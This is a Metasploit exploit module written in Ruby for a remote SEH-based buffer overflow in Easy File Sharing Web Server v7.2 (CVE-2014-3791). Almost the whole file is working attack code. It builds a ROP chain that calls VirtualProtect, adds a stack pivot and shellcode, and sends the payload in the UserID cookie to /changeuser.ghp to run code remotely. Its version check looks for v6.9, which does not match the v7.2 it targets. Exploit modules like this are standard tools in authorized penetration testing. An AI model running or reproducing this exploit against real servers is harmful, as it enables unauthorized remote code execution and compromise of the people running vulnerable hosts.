##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'Easy File Sharing Web Server v7.2 Remote SEH Based Overflow',
      'Description'  => %q{
          Easy File Sharing Web Server v7.2 Remote SEH Based Overflow
          The buffer overwrites ebx with 750+ offset, when sending 4059 it overwrites the EBX
          vulnerable file /changeuser.ghp > Cookies UserID=[buf]
          Means there are two ways to exploit changeuser.ghp
          Tested on Win7 x64 and x86, it should work on win8/win10
          By Audit0r
          https://twitter.com/Audit0rSA
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'superkojiman', # Original discovery
          'Audit0r - https://twitter.com/Audit0rSA',
          'Chris Gabriel',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '106965' ],
          [ 'CVE', ' 2014-3791' ],
          [ 'URL', 'https://www.exploit-db.com/exploits/33352/' ],
          [ 'URL', 'https://www.exploit-db.com/exploits/38526/' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00\x3B",
          'DisableNops' => true,
          'Space' => 1260,
        },

      'Targets'    =>
        [
          [ 'EFS 7.2',
            {
              'Ret'     =>  0x10017743, # pop eax # pop esi # ret  - ImageLoad.dll
              'Offset'  =>  4059,
              'EAX_Offset' => 4183,
            }
          ],
        ],
      'Privileged'  => false,
      'DisclosureDate'  => 'Oct 12 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(80)
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/')
    })
    if res.to_s.include?('Server: Easy File Sharing Web Server v6.9')
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
    [ 0x10015442,  # POP EAX # RETN [ImageLoad.dll]
      0xFFFFFDFF,  # Value of '-201'
      0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]

      # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)
      0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C]# INC DWORD PTR DS:[EAX]# RETN [ImageLoad.dll]

      # Carry on with the ROP as generated by mona.py
      0x10015442,  # POP EAX # RETN [ImageLoad.dll]
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]

      # Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location
      # used solely by the remaining part of the above gadget (it doesn't really do anything for us)
      0x1001281a,  # ADD ESP,4 # RETN [ImageLoad.dll]
      0x61c73281,  # &Writable location [sqlite3.dll]

      # And carry on further as generated by mona.py
      0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX]# RETN [ImageLoad.dll]
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll]
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll]
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll]
      0x10013ad6,  # POP EBP # RETN [ImageLoad.dll]
      0x61c227fa,  # & push esp # ret  [sqlite3.dll]
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll]

      # Now bunch of ugly increments... unfortunately couldn't find anything nicer :(
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll]
      0x61c73281,  # &Writable location [sqlite3.dll]
      0x100194b3,  # POP EDI # RETN [ImageLoad.dll]
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll]
      0x90909090,  # nop
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll]
    ].flatten.pack("V*")
    return rop_gadgets
  end

  def exploit
    sploit  = rand_text(3)                                 # PAD to align ROP NOPs
    sploit += [0x1001a858].pack('V') * 620                 # RETN (ROP NOP) [ImageLoad.dll]
    sploit += create_rop_chain()
    # move ESP out of the way so the shellcode doesn't corrupt itself during execution
    # metasm > add esp,-1500
    sploit += "\x81\xc4\x24\xfa\xff\xff"
    sploit += payload.encoded
    sploit += rand_text(target['Offset']- sploit.length)
    sploit += "BBBB"                                       # NSEH
    sploit += [0x1002280a].pack('V')                       # overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
    sploit += rand_text(target['EAX_Offset']- sploit.length)
    sploit += [0xffffffff].pack('V')                       # overwrite EAX to always trigger an exception

    print_status("#{peer} - Establishing session with target ...")
    res = send_request_cgi({
      'uri'    => normalize_uri('/changeuser.ghp'),
      'method' => 'GET',
      'headers' => {
        'Host' => target.name,
        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding' => 'gzip, deflate',
        'Referer' => 'http://' + target.name,
        'Cookie' => 'SESSIONID=31337; UserID=' + sploit + '; PassWD=;',
        'Connection' => 'Keep-Alive'
      }
    })

    handler
  end
end
